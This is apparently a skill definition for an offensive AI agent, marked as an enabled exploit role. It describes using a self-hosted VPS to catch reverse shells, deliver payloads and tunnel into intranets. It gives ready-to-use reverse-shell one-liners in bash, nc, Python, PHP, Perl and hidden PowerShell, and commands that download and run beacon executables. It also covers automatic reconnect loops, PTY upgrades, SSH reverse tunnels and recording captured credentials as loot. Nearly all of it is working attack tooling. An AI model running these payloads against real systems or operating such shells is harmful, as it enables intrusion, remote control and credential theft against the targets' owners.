---
name: vps-reverse-shell
description: Use a self-hosted VPS (<your-vps-ip>, SSH key login) as the landing point and relay for reverse shells: listeners on ports 9000-9999, driving non-interactive sessions, payload delivery, reverse tunnels
whenToUse: When the target cannot call back to this machine / a fixed public listener port is needed / a long-lived online jump host is needed / the agent must send commands to the reverse shell itself
role: exploit
enabled: true
---

# VPS relay and reverse shell (<your-vps-ip>)

Use a self-hosted public VPS as the **reverse-shell landing point + payload delivery point + intranet relay jump host**. The target only needs internet access and can connect a shell back to ports 9000-9999 on the VPS; the agent sends commands **non-interactively** through tmux sessions and reads back output.

## When to use / when not to use

| Scenario | Choice |
| --- | --- |
| Target can reach this machine directly (same segment, public IP) | Listen locally; **no need** for a VPS |
| Target can only reach outbound, this machine is behind NAT | ✅ Use the VPS; this is the main scenario |
| Target is a cloud host/container with restricted outbound but allows 80/443 | ✅ Use VPS ports 9000-9999 (if restricted, use 443/80-class ports; see troubleshooting) |
| Only need one command result | Prefer an HTTP channel from a web vulnerability/RCE; it is more stable and quieter than a reverse shell |

## Assets and credentials

```
Host    : <your-vps-ip> (Tencent Cloud, Ubuntu 24.04, 2C2G, hostname <vps hostname>)
User    : ubuntu (passwordless sudo)
Key     : ~/.dsh/redteam/toolkit/vps/id_rsa          ← permissions 600; never copy into the repo/chat
Ports   : 9000-9999                                   ← only this range is open in the cloud security group
Script  : ~/.dsh/redteam/toolkit/vps/vps.sh
```

**Key discipline**: the private key exists only at that path. Never write the key contents into skill files, reports, the repository, or chat.

Permanently occupied ports: **9001 / 9007 / 9009 (plus temporary services such as 9008)**; tmux sessions `cap / sh / up / www` exist too.
**These are not part of this exercise; do not kill or overwrite them.**

## Quick start

```bash
VPS=~/.dsh/redteam/toolkit/vps/vps.sh

$VPS status                 # show VPS status, free ports, existing sessions
$VPS listen                 # automatically pick a free port and listen (or $VPS listen 9000)
# → once you have the port, run the reverse command through the target vulnerability (next section)
$VPS send 9000 'id; uname -a'      # after the target connects back, send commands
$VPS read 9000 60                  # read output
$VPS kill 9000                     # must clean up when done
```

`listen` uses tmux + rlwrap + an **automatic re-listen loop**: after a disconnect it listens again, which suits repeated triggering.

## Tool usage (vps.sh)

| Subcommand | Purpose |
| --- | --- |
| `status` | VPS identity, system, tool readiness, 9000-9999 occupancy, tmux sessions |
| `port` | Return a free port inside 9000-9999 |
| `listen [port]` | Start a persistent listener (auto-select when port omitted) and print the target-side command template |
| `sessions` | List tmux sessions on the VPS |
| `send <port> '<cmd>'` | **Send a command into an online reverse shell** (primary use for the agent) |
| `read <port> [lines]` | Read the session's recent output (200 lines by default) |
| `watch <port>` | Continuously refresh output (for humans) |
| `attach <port>` | Take over the session with local tmux (for humans; exit with `Ctrl-B D`) |
| `kill <port>` | Stop the listener + clean up the session + free the port |
| `serve [port] [dir]` | Start an HTTP server on the VPS for payload downloads (9008 by default) |
| `push <local> [remote]` | Upload a file to the VPS |
| `get <remote> [local]` | Retrieve a file from the VPS (pull target artifacts back) |
| `sh '<cmd>'` | Run an arbitrary command on the VPS directly |

Environment overrides: `VPS_HOST`, `VPS_KEY`.

## Target-side reverse payload (use the port you are listening on)

```bash
# Bash (most common)
bash -c 'bash -i >& /dev/tcp/<your-vps-ip>/9000 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<your-vps-ip>/9000 <&1'

# nc family (versions with -e)
nc <your-vps-ip> 9000 -e /bin/bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <your-vps-ip> 9000 > /tmp/f

# Python (fallback without nc; works with python2/3)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<your-vps-ip>",9000));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# PHP (common after a web-side getshell)
php -r '$s=fsockopen("<your-vps-ip>",9000);exec("/bin/bash -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<your-vps-ip>";$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# Windows PowerShell
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<your-vps-ip>',9000);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

**URL encoding**: when going through a web vulnerability (command injection/RCE), URL-encode the entire payload before sending it, so `&` and `>` are not truncated.

## Session upgrade and stabilization

A bare `nc` shell has no TTY: `sudo` fails, `su` fails, `vi` and `top` misbehave. Upgrade:

```bash
# Run on target (python3 is most often present)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# or
script -qc /bin/bash /dev/null
```

```bash
# Local side (after attach) to make Ctrl-C/arrow keys work
# In the reverse shell, in order: Ctrl-Z
stty raw -echo; fg
# Press Enter twice, then
export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 160
```

**More robust option: full-TTY socat listener** (socat is installed on the VPS):

```bash
$VPS sh "tmux new-session -d -s rt-pty -t '' 'socat file:\`tty\`,raw,echo=0 tcp-listen:9000,reuseaddr'"
# Target side
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<your-vps-ip>:9000
```

Automatic reconnect after disconnect (target-side loop):

```bash
while true; do bash -c 'bash -i >& /dev/tcp/<your-vps-ip>/9000 0>&1'; sleep 10; done &
```

## Payload delivery (VPS as file relay)

```bash
$VPS serve 9100 ~/rt/payloads        # start an HTTP server on the VPS
$VPS push ./suo5 /home/ubuntu/rt/payloads/
# Target side (Linux)
curl -O http://<your-vps-ip>:9100/suo5  or  wget http://<your-vps-ip>:9100/suo5
# Target side (Windows)
certutil -urlcache -split -f http://<your-vps-ip>:9100/beacon.exe C:\Windows\Temp\a.exe
powershell -c "iwr http://<your-vps-ip>:9100/beacon.exe -OutFile C:\Windows\Temp\a.exe"
```

**Retrieve loot**: `$VPS get /home/ubuntu/rt/loot/dump.zip ~/.dsh/redteam/engagements/<target>/runs/`

## Reverse tunnels and relaying

When the target is in an intranet and this machine cannot reach it, use the VPS as a jump host:

```bash
# Reverse tunnel: VPS:9200 → target intranet 10.0.0.5:8080 (run on target)
ssh -R 9200:10.0.0.5:8080 -N -f -o StrictHostKeyChecking=no -i <key on target> ubuntu@<your-vps-ip>
# Afterwards access from this machine through the VPS: ssh -L 8080:127.0.0.1:9200 ubuntu@<your-vps-ip>

# socat port forwarding (on the VPS)
$VPS sh "tmux new-session -d -s fwd-9200 'socat TCP-LISTEN:9200,reuseaddr,fork TCP:10.0.0.5:8080'"
```

For webshell scenarios, pair with skill `suo5-tunnel`: run the suo5 client locally, upload the server to the target, and exit the tunnel through the VPS for stability.

## Discipline (must follow)

1. **Port discipline**: use only 9000-9999; check with `$VPS port` or `$VPS status` before listening; **never occupy or kill 9001, 9007, 9009 or the `cap/sh/up/www` sessions**.
2. **Always `$VPS kill <port>` when done**; do not leave bare listeners (they consume resources and leave traces).
3. **Record credentials locally, not on the VPS**: write passwords/hashes captured on the target with `redteam_credential_add` into the local asset database (plaintext `secret_value`), store artifacts under local `runs/`; **do not write credentials into the VPS home directory**.
4. **The VPS IP is visible to the target**: it is part of this exercise's infrastructure; do not leave extra personal information about anything else on the target.
5. **Record**: each successfully obtained shell with `redteam_access_add` (host/account/method/privilege/session reference), each credential with `redteam_credential_add`, and attack scripts with `redteam_attack_file_add`.
6. **Every command sent with `send` must yield evidence readable with `read`**; redirect important output to a file first and `get` it back, so tmux scrollback does not flush it.

## Troubleshooting

| Symptom | Action |
| --- | --- |
| Target cannot connect back | Confirm the listener exists: `$VPS sessions` + `$VPS sh "ss -ltnp \| grep <port>"`; confirm target outbound (on target, `curl -s http://<your-vps-ip>:<port>` returning a connection success means the port is reachable) |
| Port outside range / port change | The cloud security group only opens 9000-9999; out-of-range always fails |
| Repeated disconnects | Add a `while true` reconnect loop target-side; or use the socat full-TTY option |
| Output appears but commands do not run | Payload truncated by URL (`&`/`>`); URL-encode the whole payload |
| Garbled non-ASCII text | On target `export LANG=C.UTF-8`, or set `tmux set -t rt-<port> utf8 on` before `read` |
| No TTY, `sudo` errors | Upgrade the PTY (see above) |
| Local port probe says "all ports connect" | The local gateway answers SYN-ACK on any port; **local `nc -z` cannot judge VPS port reachability**; verify from an external node or the target itself |

## Relationship to other skills

- `suo5-tunnel`: webshell → SOCKS5 tunnel; egress can go through this VPS
- `webshell-toolkit`: Behinder/Godzilla/AntSword; managing access after obtaining a webshell
- `cn-proxy-pool`: add proxies when a China-region egress IP is needed (do not modify local network configuration)
- `active-scan` / `fofa-recon`: continue mapping once the intranet is reachable
